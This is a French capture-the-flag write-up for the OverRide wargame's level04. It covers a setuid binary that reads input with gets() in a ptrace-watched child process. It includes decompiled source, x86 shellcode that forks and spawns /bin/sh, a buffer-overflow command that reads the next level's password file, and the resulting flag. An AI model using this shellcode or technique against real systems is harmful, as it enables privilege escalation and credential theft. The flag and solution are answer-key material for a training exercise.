# OverRide : [level04]

### Observation :
En arrivant sur le level04 on trouve un exécutable nommé level04.\
Quand nous essayons de le lancer cela nous demande un shellcode puis écrit "child is exiting...". \
Regardons donc avec gdb ou un decompilateur.

---

#### Source décompilée:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int stat_loc; // [esp+1Ch] [ebp-9Ch] BYREF
  char s[128]; // [esp+20h] [ebp-98h] BYREF
  int v6; // [esp+A0h] [ebp-18h]
  int v7; // [esp+A4h] [ebp-14h]
  int v8; // [esp+A8h] [ebp-10h]
  __pid_t v9; // [esp+ACh] [ebp-Ch]

  v9 = fork();
  memset(s, 0, sizeof(s));
  v8 = 0;
  stat_loc = 0;
  if ( v9 )
  {
    do
    {
      wait(&stat_loc);
      v6 = stat_loc;
      if ( (stat_loc & 0x7F) == 0 || (v7 = stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
      {
        puts("child is exiting...");
        return 0;
      }
      v8 = ptrace(PTRACE_PEEKUSER, v9, 44, 0);
    }
    while ( v8 != 11 );
    puts("no exec() for you");
    kill(v9, 9);
  }
  else
  {
    prctl(1, 1);
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    puts("Give me some shellcode, k");
    gets(s);
  }
  return 0;
}
```

#### Détails du programme:
```bash
-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>` | |


#### Conclusions:

----
Résolution:
----



#### Injection:
```asm
# La fonction injectée appelle <fork>:

0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  b0 02                   mov    al,0x2
5:  cd 80                   int    0x80
```

```asm
# La fonction injectée appelle <system> avec '/bin/sh' en paramètre:

0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 53                      push   ebx
11: 89 e1                   mov    ecx,esp
13: 99                      cdq
14: b0 0b                   mov    al,0xb
16: cd 80                   int    0x80
```



#### Commande:
```bash
echo $(echo $(unset $(env | cut -d= -f1); (/usr/bin/python -c "print('\x31\xc0\x50\xb0\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\xFF'*(156 - 31) + '\xff\xff\xdd\xa0'[::-1])" ; /bin/echo '/bin/cat /home/users/level05/.pass') | /home/users/level04/level04 ))
```

**Flag :** 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
